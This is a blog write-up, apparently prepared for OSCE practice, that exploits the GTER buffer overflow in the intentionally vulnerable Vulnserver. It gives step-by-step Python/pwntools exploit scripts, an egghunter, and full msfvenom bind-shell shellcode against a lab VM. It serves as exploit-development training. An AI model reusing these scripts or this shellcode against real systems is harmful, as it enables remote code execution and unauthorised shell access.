---
layout: post
title: Exploiting Vulnserver GTER (egghunter + pwntools)
categories: [re,exploit]
tags: [osce]
fullview: false
comments: true
---
Vulnserver is one of the best tools to practice Windows binary exploitation. It is also highly recommended as complementary training for the OSCE certification.

You can download it from [here](https://github.com/stephenbradshaw/vulnserver) along with the required essfunc.dll file.

There are multiple ways to exploit it, using the different parameters avaliable. This time we will exploit it using the GTER parameter. You might also find awesome writeups [here](https://capt-meelo.github.io/exploitdev/osceprep/2018/06/28/vulnserver-gter.html) and [here](https://www.absolomb.com/2018-07-24-VulnServer-GTER/), the later using a techinque different from the one I used here.

![1]({{ "/assets/media/vulnserver/vulnserver_gter_1.png" | absolute_url }})


Deployed environment:
* Client: Kali Linux (VM) - 192.168.0.51
* Server: Windows XP SP3 (VM) - 192.168.0.57

## Fuzzing
One of the best ways to start is fuzzing the application. I will use the SPIKE fuzzer for this task, but you might prefer newer ones like [boofuzz](https://github.com/jtpereyda/boofuzz).

In order to build our SPIKE template we need first to understand how the messages flow between the client and the server. To do that we open Wireshark and connect to the server:

![2]({{ "/assets/media/vulnserver/vulnserver_gter_2.png" | absolute_url }})

![3]({{ "/assets/media/vulnserver/vulnserver_gter_3.png" | absolute_url }})

Now we can create our template an fuzz the GTER parameter.

~~~
s_read_packet();
s_string("GTER ");
s_string_variable("123");
s_string("\r\n");
~~~

Now we attach OllyDbg to vulnserver and run SPIKE:

	generic_send_tcp 192.168.0.57 6666 gter.spk 0 0

![4]({{ "/assets/media/vulnserver/vulnserver_gter_4.png" | absolute_url }})

![5]({{ "/assets/media/vulnserver/vulnserver_gter_5.png" | absolute_url }})

We can see from analyzing the stack that the program received 171 *A*s along with the string ` /.:/` right after the GTER parameter:

~~~
00F4FA58   00038EC0  ASCII "GTER /.:/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
~~~

## pwntools FTW
In order to document our exploit and make it reusable we will write it down into a Python script. We will also use the awesome *pwntools* module, although you could also accomplish this task by using the *sockets* module directly.

We first need to cofirm the payload offset that will overwrite EIP.

~~~
from pwn import *

def doCrash(size):
    conn = remote('192.168.0.57', 6666, typ='tcp')
    payload = "GTER /.:/" + cyclic_metasploit(size) + "\r\n"
    print("Sending: {}".format(payload))
    conn.send(payload)
    conn.close()

def getCrashBuffer(offset):
    return cyclic_metasploit_find(offset)

doCrash(1000)
print("EIP is overwritten at offset: {}".format(getCrashBuffer(0x66413066))) #151
print("ESP is overwritten at offset: {}".format(getCrashBuffer(0x32664131))) #155
print("Total buffer lenght: {}".format(getCrashBuffer(0x41376641))) #171
~~~

The *cyclic_metasploit* method generates a [De Bruijn](http://mathworld.wolfram.com/deBruijnSequence.html) sequence used by Metasploit, mona.py, gdb-peda and others. The *cyclic_metasploit_find* method is used to find the offset of a specifc subsequence.

![6]({{ "/assets/media/vulnserver/vulnserver_gter_6.png" | absolute_url }})

![7]({{ "/assets/media/vulnserver/vulnserver_gter_7.png" | absolute_url }})

[JollyFrogs](https://www.jollyfrogs.com/) gently shared his pattern generator/finder script so we don't even need to use pre-built stuff (slightly modified here). Cheers mate!

~~~
from string import *
from termcolor import colored

def pattern_gen(int_length):
    """
    Generate a pattern of a given length up to a maximum
    of 20280 - after this the pattern would repeat
    """
    if int_length >= 20280: error_and_exit("[] Error: Pattern length exceeds max")
    pattern = ""
    for upper in ascii_uppercase:
        for lower in ascii_lowercase:
            for digit in digits:
                if len(pattern) < int_length:
                    pattern += upper+lower+digit
    return pattern

def pattern_search(str_search_pattern):
    """
    Search for str_search_pattern in pattern.
    Looking for needle in haystack
    """
    searchpattern = pattern_gen(20279)
    pattern = str_search_pattern
    if searchpattern.index(pattern) == None:
      error_and_exit("[] Error: Pattern not found")
    else:
      print(colored("[*] Pattern found at offset: "+str(searchpattern.index(pattern)),"green"))

print(pattern_gen(100))
pattern_search('\x34\x41\x63\x35\x41\x63\x36')
~~~

## 1st stage
The natural next step would be to overwrite EIP with the address to a buffer where the shellcode would be stored. Since ESP also points to our buffer, we could make EIP point to a `JMP ESP` instruction. And here, my friends, is where we face our first issue.

As you can see above, our whole buffer has only 171 bytes and ESP points to byte 155. This means we have a 20-bytes buffer to insert our payload! Since that is an insanely small buffer for virtually any shellcode, we must manage to use this space as a trampoline to another larger buffer. 

What about those 151 bytes before EIP? While this is not enough for a decent shellcode, which should count for at least 300 bytes, it is good enough for a somewhat more robust second stage.

To find an address for `JMP ESP` we can open the executable modules, pick `essfunc.dll` and search for the desired command, in this case `\xAF\x11\x50\x62`.

To jump back the 151 bytes, we may assemble the `JMP SHORT -152` instruction using [this](https://defuse.ca/online-x86-assembler.htm#disassembly) great site. The resulting opcode is `\xE9\x64\xFF\xFF\xFF`, which fortunately does not contain any NULLs.

~~~
from pwn import *

def expl():
    conn = remote('192.168.0.57', 6666, typ='tcp')
    EIP = "\xaf\x11\x50\x62"
    jmpBack = "\xe9\x64\xff\xff\xff" #did not invert bytes since it goes to the stack!
    buf = "A"*147 + EIP + jmpBack + "C"*300
    payload = "GTER /.:/" + buf + "\r\n"
    conn.send(payload)
    print(conn.recv(1024))
    conn.close()

expl()
~~~

To verify we successfully control the program flow we set a breakpoint at `\xaf\x11\x50\x62`.

![8]({{ "/assets/media/vulnserver/vulnserver_gter_8.png" | absolute_url }})
![9]({{ "/assets/media/vulnserver/vulnserver_gter_9.png" | absolute_url }})

> **Note:** one might also want to try subracting some bytes from ESP and the jumping into it instead of directly jumping to the hardcoded address. While this is a possible solution, you might find yourself struggling with stack alignmet issues, since you are altering ESP. In case you run into this problem, try adding the subtracted amount to ESP after the jump.

# 2nd stage
Now we can use this relatively large buffer to insert our second stage. The obvious choice here is to use an egghunter.

~~~
from pwn import *

def expl():
    conn = remote('192.168.0.57', 6666, typ='tcp')
    EIP = "\xAF\x11\x50\x62"
    jmpBack = "\xe9\x64\xff\xff\xff" #not inverted bytes since it goes to the stack!

    #32 bytes egghunter - egg b33f
    eggHunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x62\x33\x33\x66\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
    buf = "\x90"*30 + eggHunter + "\x90"*85 + EIP + jmpBack + "C"*300
    payload = "GTER /.:/" + buf + "\r\n"
    conn.send(payload)
    print(conn.recv(1024))
    conn.close()

expl()
~~~

![10]({{ "/assets/media/vulnserver/vulnserver_gter_10.png" | absolute_url }})

Notice we have set a few NOPs before and after the egghunter just to make the exploit a little more reliable (30 NOPs + 32 egghunter + 85 NOPs = 147 bytes).

# 3rd stage
This is the most critical part in my opinion. Yes we decided to use an egghunter, great. The point is: how can we store the shellcode in some other place in memory? There is only one variable and we already know where it is mapped to!

![Boxes everywhere!](https://i.imgflip.com/12h1ju.jpg "Boxes are round")

Remember all those other parameters in vulnserver? Well, we could use them to send the shellcode and hope for it to be stored in a large, smooth and happy buffer. THEN our egghunter will finally make sense!

As we don't know which parameter we should use, why not try each and every one of them? Except for GTER of course.
After running it we realize KSTET breaks our exploit so we also remove it.

~~~
from pwn import *

#msfvenom -a x86 --platform windows -p windows/shell_bind_tcp -e x86/mixed_alpha -f python
buf =  "b33fb33f" #eggegg
buf += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
buf += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
buf += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
buf += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
buf += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
buf += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
buf += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
buf += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
buf += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
buf += "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
buf += "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
buf += "\xff\xd5\x6a\x08\x59\x50\xe2\xfd\x40\x50\x40\x50\x68"
buf += "\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x11\x5c\x89"
buf += "\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x57"
buf += "\x68\xb7\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1"
buf += "\xff\xd5\x57\x97\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63"
buf += "\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59"
buf += "\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24"
buf += "\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56"
buf += "\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e"
buf += "\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0"
buf += "\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
buf += "\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00"
buf += "\x53\xff\xd5"


def expl():
    conn = remote('192.168.0.57', 6666, typ='tcp')
    EIP = "\xAF\x11\x50\x62"
    jmpBack = "\xe9\x64\xff\xff\xff" #not inverted bytes since it goes to the stack!
    #32 bytes egghunter
    eggHunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x62\x33\x33\x66\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
    buf = "\x90"*30 + eggHunter + "\x90"*85 + EIP + jmpBack + "C"*300
    payload = "GTER /.:/" + buf + "\r\n"
    conn.send(payload)
    print(conn.recv(1024))
    conn.close()

def runOptions(buf):
    for op in ['STATS', 'RTIME', 'LTIME', 'SRUN', 'TRUN', 'GMON', 'GDOG', 'HTER', 'LTER', 'KSTAN']: #removed GTER and KSTET
        conn = remote('192.168.0.57', 6666, typ='tcp')
        payload = op + " " + buf
        print('Sending: {}'.format(payload))
        conn.send(payload)
        print(conn.recv(1024))
        conn.close()

runOptions(buf)
expl()
~~~

![11]({{ "/assets/media/vulnserver/vulnserver_gter_11.png" | absolute_url }})

![12]({{ "/assets/media/vulnserver/vulnserver_gter_12.png" | absolute_url }})

> **Note:** Windows XP SP3 has DEP enabled by default. In order to correcly run this exploit you must turn DEP off for vulnserver.exe.
